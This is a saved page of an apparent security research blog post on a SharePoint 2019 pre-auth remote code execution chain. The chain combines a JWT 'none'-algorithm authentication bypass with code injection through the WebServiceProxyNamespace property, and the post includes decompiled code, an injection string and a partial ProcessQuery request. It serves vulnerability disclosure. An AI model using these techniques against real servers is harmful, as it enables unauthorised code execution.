[17] //... CodeCompileUnit codeCompileUnit = new CodeCompileUnit(); codeCompileUnit.Namespaces.Add(codeNamespace); // [18] codeCompileUnit.ReferencedAssemblies.Add(\"System.dll\"); //... CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider(\"CSharp\"); StringCollection stringCollection = null; //... using (TextWriter textWriter = new StringWriter(new StringBuilder(), CultureInfo.InvariantCulture)) { CodeGeneratorOptions codeGeneratorOptions = new CodeGeneratorOptions(); codeDomProvider.GenerateCodeFromCompileUnit(codeCompileUnit, textWriter, codeGeneratorOptions); textWriter.Flush(); sourceCode = textWriter.ToString(); // [19] } CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromDom(compilerParameters, new CodeCompileUnit[] { codeCompileUnit }); // [20] //... } The main logic of this method is to generate an Assembly with the proxyNameSpace. At [17], an instance of CodeNamespace is initialized using the proxyNamespaceName parameter. This CodeNamespace instance is then added to codeCompileUnit.Namespaces at [18]. After that, at [19], codeDomProvider.GenerateCodeFromCompileUnit() will generate the source code using the aforesaid codeCompileUnit which included our proxyNamespaceName, storing the source code in the variable sourceCode.\nIt was discovered that no validation is done for the proxyNamespaceName parameter. Consequently, by supplying malicious input as the proxyNamespaceName parameter, arbitrary contents can be injected into the code to be compiled for the Assembly to be generated at [20].\nFor example:\n If proxyNamespaceName is Foo, then the generated code is:  namespace Foo{}  But if a malicious input such as Hacked{} namespace Foo is supplied for the proxyNamespaceName parameter, the following code is generated and compiled:  namespace Hacked{ //Malicious code } namespace Foo{} The DynamicProxyGenerator.GenerateProxyAssembly() method is invoked via reflection in WebServiceSystemUtility.GenerateProxyAssembly():\n[PermissionSet(SecurityAction.Assert, Name = \"FullTrust\")] public virtual ProxyGenerationResult GenerateProxyAssembly(ILobSystemStruct lobSystemStruct, INamedPropertyDictionary lobSystemProperties) { AppDomain appDomain = AppDomain.CreateDomain(lobSystemStruct.Name, new Evidence(new object[] { new Zone(SecurityZone.MyComputer) }, new object[0]), setupInformation, permissionSet, new StrongName[0]); object dynamicProxyGenerator = null; SPSecurity.RunWithElevatedPrivileges(delegate { dynamicProxyGenerator = appDomain.CreateInstanceAndUnwrap(this.GetType().Assembly.FullName, \"Microsoft.SharePoint.BusinessData.SystemSpecific.WebService.DynamicProxyGenerator\", false, BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, null, null, null, null); // [21] }); Uri uri = WebServiceSystemPropertyParser.GetUri(lobSystemProperties, \"WsdlFetchUrl\"); string webServiceProxyNamespace = WebServiceSystemPropertyParser.GetWebServiceProxyNamespace(lobSystemProperties); // [22] string webServiceProxyProtocol = WebServiceSystemPropertyParser.GetWebServiceProxyProtocol(lobSystemProperties); WebProxy webProxy = WebServiceSystemPropertyParser.GetWebProxy(lobSystemProperties); object[] array = null; try { array = (object[])dynamicProxyGenerator.GetType().GetMethod(\"GenerateProxyAssemblyInfo\", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic).Invoke(dynamicProxyGenerator, new object[] { uri, webServiceProxyNamespace, webServiceProxyProtocol, webProxy, null, httpAuthenticationMode, text, text2 }); // [23] } //... The reflection calls can be found at [21] and [23].\nAt [22], notice that the proxyNamespaceName is retrieved from method WebServiceSystemPropertyParser.GetWebServiceProxyNamespace(), which retrieves the WebServiceProxyNamespace property of the current LobSystem:\ninternal static string GetWebServiceProxyNamespace(INamedPropertyDictionary lobSystemProperties) { //... string text = lobSystemProperties[\"WebServiceProxyNamespace\"] as string; if (!string.IsNullOrEmpty(text)) { return text.Trim(); } //... } To reach the WebServiceSystemUtility.GenerateProxyAssembly() method, it was discovered that the Microsoft.SharePoint.BusinessData.MetadataModel.ClientOM.Entity.Execute() method could be used. As explained later on, this Entity.Execute() method can also be used to load the generated Assembly and instantiate a Type within the generated Assembly, thereby allowing for remote code execution.\nThe relevant code of the Microsoft.SharePoint.BusinessData.MetadataModel.ClientOM.Entity.Execute() method is shown below:\n... [ClientCallableMethod] // [24] ... internal MethodExecutionResult Execute([ClientCallableConstraint(FixedId = \"1\", Type = ClientCallableConstraintType.NotNull)] [ClientCallableConstraint(FixedId = \"2\", Type = ClientCallableConstraintType.NotEmpty)] string methodInstanceName, [ClientCallableConstraint(FixedId = \"3\", Type = ClientCallableConstraintType.NotNull)] LobSystemInstance lobSystemInstance, object[] inputParams) // [25] { if (((ILobSystemInstance)lobSystemInstance).GetLobSystem().SystemType == SystemType.DotNetAssembly) // [26] { throw new InvalidOperationException(\"ClientCall execute for DotNetAssembly lobSystem is not allowed.\"); } //... this.m_entity.Execute(methodInstance, lobSystemInstance, ref array); // [27] } At [24], since the method has the [ClientCallableMethod] attribute, the method is accessible via SharePoint REST APIs. There is a check at [26] to ensure that the SystemType of the LobSystem is not be equals to SystemType.DotNetAssembly before calling this.m_entity.Execute() at [27].\nHowever, there is a small hurdle at this point ‚Äì at [25], how does one obtain a valid reference of LobSystemInstance and supply it as an argument via REST API? It turns out that using the Client Query feature, it is possible to reference the desired LobSystemInstance through the use of ObjectIdentity, which is constructed by BCSObjectFactory. Essentially, using the Client Query feature allows invoking of any methods with the [ClientCallableMethod] attribute, and allow supplying of non-trivial arguments like object references.\nFor example, a request can be made to /_vti_bin/client.svc/ProcessQuery with the following request body to obtain a reference of the desired LobSystemInstance:\n Id=\"17\" Name=\"|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:jHRORCVc,jHRORCVc\" / The static values used in the above payload are explained below:\n 4da630b6-36c5-4f55-8e01-5cd40e96104d refers to the type ID used by BCSObjectFactory.GetObjectById(). lsifile will return the LobSystemInstance from BDCMetaCatalog file  BDCMetaCatalog refers to the Business Data Connectivity Metadata (BDCM) catalog, and LobSystem and Entity objects are stored within the BDCM catalog. The data of BDCM catalog can either be stored in the database or in a file located at /BusinessDataMetadataCatalog/BDCMetadata.bdcm rooted at the SharePoint site URL.\nWhile analyzing BCSObjectFactory.GetObjectById(), it was discovered that it is possible to construct and obtain a reference of the LobSystem, LobSystemInstance and Entity from a BDCM catalog file.\nLuckily, it is possible to write to the BDCM catalog file. This would mean that arbitrary LobSystem objects can be inserted, and arbitrary Property objects within the LobSystem object, such as the WebServiceProxyNamespace property, can be specified. Consequently, code injection via the WebServiceProxyNamespace property of the LobSystem object allows arbitrary code to be injected into the Assembly generated.\nGoing back to [27], this.m_entity can be an instance of Microsoft.SharePoint.BusinessData.MetadataModel.Dynamic.DataClass or Microsoft.SharePoint.BusinessData.MetadataModel.Static.DataClass. Regardless, both methods will eventually call Microsoft.SharePoint.BusinessData.Runtime.DataClassRuntime.Execute().\nSubsequently, DataClassRuntime.Execute() will call DataClassRuntime.ExecuteInternal() - ExecuteInternalWithAuthNFailureRetry() - WebServiceSystemUtility.ExecuteStatic():\npublic override void ExecuteStatic(IMethodInstance methodInstance, ILobSystemInstance lobSystemInstance, object[] args, IExecutionContext context) { //... if (!this.initialized) { this.Initialize(lobSystemInstance); // [28] } object obj = lobSystemInstance.CurrentConnection; bool flag = obj != null; if (!flag) { try { obj = this.connectionManager.GetConnection(); // [29] //... } //... } //... }\tAt [28], WebServiceSystemUtility.Initialize() will be called:\nprotected virtual void Initialize(ILobSystemInstance lobSystemInstance) { INamedPropertyDictionary properties = lobSystemInstance.GetProperties(); //... this.connectionManager = ConnectionManagerFactory.Value.GetConnectionManager(lobSystemInstance); // [30] //... } At [30], ConnectionManagerFactory.Value.GetConnectionManager(lobSystemInstance) will initialise and return the ConnectionManager for the current LobSystem instance. With WebServiceSystemUtility, this.connectionManager will be an instance of WebServiceConnectionManager.\nThe relevant code of WebServiceConnectionManager is shown below:\npublic override void Initialize(ILobSystemInstance forLobSystemInstance) { //... this.dynamicWebServiceProxyType = this.GetDynamicProxyType(forLobSystemInstance); // [31] this.loadController = LoadController.GetLoadController(forLobSystemInstance) as LoadController; } protected virtual Type GetDynamicProxyType(ILobSystemInstance forLobSystemInstance) { Type type = null; Assembly proxyAssembly = ProxyAssemblyCache.Value.GetProxyAssembly(forLobSystemInstance.GetLobSystem()); // [32] INamedPropertyDictionary properties = forLobSystemInstance.GetProperties(); //... } At [31], WebServiceConnectionManager.Initialize() calls WebServiceConnectionManager.GetDynamicProxyType(), which calls ProxyAssemblyCache.GetProxyAssembly() at [32], to retrieve a Type within the generated Assembly and store within this.dynamicWebServiceProxyType.\nAt [32], ProxyAssemblyCache.GetProxyAssembly() will call the ICompositeAssemblyProvider.GetCompositeAssembly() with a LobSystem instance as argument. In this context, compositeAssemblyProvider is an instance of LobSystem.\nCompositeAssembly ICompositeAssemblyProvider.GetCompositeAssembly() { CompositeAssembly compositeAssembly; ISystemProxyGenerator systemProxyGenerator = Activator.CreateInstance(this.SystemUtilityType) as ISystemProxyGenerator; // [33] proxyGenerationResult = systemProxyGenerator.GenerateProxyAssembly(this, base.GetProperties()); // [34] //... } At [33], an instance of WebServiceSystemUtility is stored in systemProxyGenerator, so WebServiceSystemUtility.GenerateProxyAssembly() is subsequently called at [34]. At this point, since the LobSystem is initialised using the crafted BDCMetadataCatalog file, the attacker has control over the properties of the LobSystem and hence is able to inject arbitrary code within the generated Assembly!\nAfter returning from ProxyAssemblyCache.GetProxyAssembly() at [32] , a Type within the generated Assembly will be returned and stored into this.dynamicWebServiceProxyType. WebServiceConnectionManager.GetConnection() will be called at [29] after WebServiceSystemUtility.Initialize() at [28]:\npublic override object GetConnection() { //... try { httpWebClientProtocol = (HttpWebClientProtocol)Activator.CreateInstance(this.dynamicWebServiceProxyType); } //... } This method directly creates a new object instance of the type specified in this.dynamicWebServiceProxyType, which executes the injected (malicious) code earlier on at [18].\nChaining the two bugs together, an unauthenticated attacker is able to achieve remote code execution (RCE) on the target SharePoint server. üòÅ.\nThere are many other interesting things which I found out during the process, but the length of the article is too long.\nI will probably combine it in another article later.\nThank you for reading!\nThanks Ngo Wei Lin, Li Jiantao \u0026 Poh Jia Hao for reviewing and enriching this nasty blog post. Thanks to ZDI for spending time to review the contents as well.\nDemo   ",
  "wordCount" : "3691",
  "inLanguage": "en",
  "datePublished": "2023-09-25T00:00:00Z",
  "dateModified": "2023-09-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Nguy·ªÖn Ti·∫øn Giang (Jang)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png" alt="logo" aria-label="logo" height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt + /)" accesskey="/">
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;¬ª&nbsp;<a href="https://starlabs.sg/blog/">Blogs</a></div>
    <h1 class="post-title">
      [P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955)
    </h1>
    <div class="post-meta"><span title="2023-09-25 00:00:00 +0000 UTC">September 25, 2023</span>&nbsp;¬∑&nbsp;18 min&nbsp;¬∑&nbsp;Nguy·ªÖn Ti·∫øn Giang (Jang)

</div>
  </header> <div class="toc">
    <details>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#brief" aria-label="Brief">Brief</a></li>
                <li>
                    <a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#affected-productstested-version" aria-label="Affected products/Tested version">Affected products/Tested version</a></li>
                <li>
                    <a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#vulnerability-1-sharepoint-application-authentication-bypass" aria-label="Vulnerability #1: SharePoint Application Authentication Bypass">Vulnerability #1: SharePoint Application Authentication Bypass</a></li>
                <li>
                    <a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#vulnerability-2-code-injection-in-dynamicproxygeneratorgenerateproxyassembly" aria-label="Vulnerability #2: Code Injection in DynamicProxyGenerator.GenerateProxyAssembly()">Vulnerability #2: Code Injection in DynamicProxyGenerator.GenerateProxyAssembly()</a></li>
                <li>
                    <a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#demo" aria-label="Demo">Demo</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="brief">Brief<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#brief">#</a></h2>
<p>I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.</p>
<p>This exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:</p>
<ol>
<li>Authentication Bypass ‚Äì An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the <code>none</code> signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication. This vulnerability has been found right after I started this project for two days.</li>
<li>Code Injection ‚Äì A SharePoint user with <code>Sharepoint Owners</code> permission can inject arbitrary code by replacing <code>/BusinessDataMetadataCatalog/BDCMetadata.bdcm</code> file in the web root directory to cause compilation of the injected code into an assembly that is subsequently executed by SharePoint. This vulnerability was found on Feb 2022.</li>
</ol>
<p>The specific part of the Authentication Bypass vuln is: it can access to SharePoint API only. So, the most difficult part is to find the post-auth RCE chain that using SP API.</p>
<p><img loading="lazy" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/09-SharePoint-Pre-Auth-RCE-chain_doesnotsimply.png" alt="">
</p>
<h2 id="affected-productstested-version">Affected products/Tested version<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#affected-productstested-version">#</a></h2>
<ul>
<li>SharePoint 2019</li>
<li>Tested Version: SharePoint 2019 (16.0.10396.20000) with March 2023 patch (<a href="https://support.microsoft.com/help/5002358">KB5002358</a> and <a href="https://support.microsoft.com/help/5002357">KB5002357</a>)</li>
<li>Patch download:
<ul>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=105064">https://www.microsoft.com/en-us/download/details.aspx?id=105064</a></li>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=105078">https://www.microsoft.com/en-us/download/details.aspx?id=105078</a></li>
</ul>
</li>
</ul>
<h2 id="vulnerability-1-sharepoint-application-authentication-bypass">Vulnerability #1: SharePoint Application Authentication Bypass<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#vulnerability-1-sharepoint-application-authentication-bypass">#</a></h2>
<p>With the default SharePoint setup configuration, almost every requests send to SharePoint site will require NTLM Auth to process.
While analyzing web config file, I‚Äôve realized that there are at least 4 authentication types we can use.
<img loading="lazy" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/09-SharePoint-Pre-Auth-RCE-chain_auth_module.png" alt="">
</p>
<table>
<thead>
<tr>
<th>Auth Module</th>
<th>Handled by class</th>
</tr>
</thead>
<tbody>
<tr>
<td>FederatedAuthentication</td>
<td>SPFederationAuthenticationModule</td>
</tr>
<tr>
<td>SessionAuthentication</td>
<td>SPSessionAuthenticationModule</td>
</tr>
<tr>
<td>SPApplicationAuthentication</td>
<td>SPApplicationAuthenticationModule</td>
</tr>
<tr>
<td>SPWindowsClaimsAuthentication</td>
<td>SPWindowsClaimsAuthenticationHttpModule</td>
</tr>
</tbody>
</table>
<p>I started to analyzing these modules one by one, then I‚Äôve found something interesting in the <strong>SPApplicationAuthenticationModule</strong>.</p>
<p>This module registers the <code>SPApplicationAuthenticationModule.AuthenticateRequest()</code> method for the Http event <code>AuthenticateRequest</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-keyword">namespace</span></span> <span class="nn"><span class="hljs-title">Microsoft.SharePoint.IdentityModel</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">internal</span></span> <span class="k"><span class="hljs-keyword">sealed</span></span> <span class="k"><span class="hljs-keyword">class</span></span> <span class="nc"><span class="hljs-title">SPApplicationAuthenticationModule</span></span> <span class="p">:</span> <span class="n"><span class="hljs-title">IHttpModule</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">Init</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpApplication</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">context</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">context</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">ArgumentNullException</span><span class="p">(</span><span class="s"><span class="hljs-string">"context"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">context</span><span class="p">.</span><span class="n">AuthenticateRequest</span> <span class="p">+=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">AuthenticateRequest</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">context</span><span class="p">.</span><span class="n">PreSendRequestHeaders</span> <span class="p">+=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">PreSendRequestHeaders</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So everytime we try to send HTTP request to SharePoint Site, this method will be called to handle the authentication logic!
Take a closer look at the <code>SPApplicationAuthenticationModule.AuthenticateRequest()</code> method, <code>SPApplicationAuthenticationModule.ShouldTryApplicationAuthentication()</code> will be called to check if the current URL is permitted to use OAuth as the authentication method:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">AuthenticateRequest</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">object</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">sender</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">EventArgs</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="n">SPApplicationAuthenticationModule</span><span class="p">.</span><span class="n">ShouldTryApplicationAuthentication</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">spfederationAuthenticationModule</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [1]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">spidentityReliabilityMonitorAuthenticateRequest</span><span class="p">.</span><span class="n">ExpectedFailure</span><span class="p">(</span><span class="n">TaggingUtilities</span><span class="p">.</span><span class="n">ReserveTag</span><span class="p">(</span><span class="m"><span class="hljs-number">18990616</span></span><span class="n"><span class="hljs-number">U</span></span><span class="p">),</span> <span class="s"><span class="hljs-string">"Not an OAuthRequest."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">else</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt"><span class="hljs-keyword">bool</span></span> <span class="n">flag</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">ConstructIClaimsPrincipalAndSetThreadIdentity</span><span class="p">(</span><span class="n">httpApplication</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">spfederationAuthenticationModule</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">text</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [2]</span></span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">      <span class="n">spidentityReliabilityMonitorAuthenticateRequest</span><span class="p">.</span><span class="n">Success</span><span class="p">(</span><span class="k"><span class="hljs-literal">null</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">else</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">      <span class="n">OAuthMetricsEventHelper</span><span class="p">.</span><span class="n">LogOAuthMetricsEvent</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">QosErrorType</span><span class="p">.</span><span class="n">ExpectedFailure</span><span class="p">,</span> <span class="s"><span class="hljs-string">"Can't sign in using token."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[1]</strong>, If the request URL contains one of these patterns, it will be allowed to use OAuth authentication:</p>
<ul>
<li><code>/_vti_bin/client.svc</code></li>
<li><code>/_vti_bin/listdata.svc</code></li>
<li><code>/_vti_bin/sites.asmx</code></li>
<li><code>/_api/</code></li>
<li><code>/_vti_bin/ExcelRest.aspx</code></li>
<li><code>/_vti_bin/ExcelRest.ashx</code></li>
<li><code>/_vti_bin/ExcelService.asmx</code></li>
<li><code>/_vti_bin/PowerPivot16/UsageReporting.svc</code></li>
<li><code>/_vti_bin/DelveApi.ashx</code></li>
<li><code>/_vti_bin/DelveEmbed.ashx</code></li>
<li><code>/_layouts/15/getpreview.ashx</code></li>
<li><code>/_vti_bin/wopi.ashx</code></li>
<li><code>/_layouts/15/userphoto.aspx</code></li>
<li><code>/_layouts/15/online/handlers/SpoSuiteLinks.ashx</code></li>
<li><code>/_layouts/15/wopiembedframe.aspx</code></li>
<li><code>/_vti_bin/homeapi.ashx</code></li>
<li><code>/_vti_bin/publiccdn.ashx</code></li>
<li><code>/_vti_bin/TaxonomyInternalService.json/GetSuggestions</code></li>
<li><code>/_layouts/15/download.aspx</code></li>
<li><code>/_layouts/15/doc.aspx</code></li>
<li><code>/_layouts/15/WopiFrame.aspx</code></li>
</ul>
<p>When the above condition is satisfied, <code>SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity()</code> will invoked to continue processing the authentication request at <strong>[2]</strong>.</p>
<p>The relevant code for the <code>SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity()</code> method is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ConstructIClaimsPrincipalAndSetThreadIdentity</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpApplication</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpApplication</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpContext</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">SPFederationAuthenticationModule</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">fam</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">tokenType</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">TryExtractAndValidateToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">spincomingTokenContext</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">spidentityProofToken</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [3]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULS</span><span class="p">.</span><span class="n">SendTraceTag</span><span class="p">(</span><span class="m"><span class="hljs-number">832154</span></span><span class="n"><span class="hljs-number">U</span></span><span class="p">,</span> <span class="n">ULSCat</span><span class="p">.</span><span class="n">msoulscat_WSS_ApplicationAuthentication</span><span class="p">,</span> <span class="n">ULSTraceLevel</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s"><span class="hljs-string">"SPApplicationAuthenticationModule: Couldn't find a valid token in the request."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
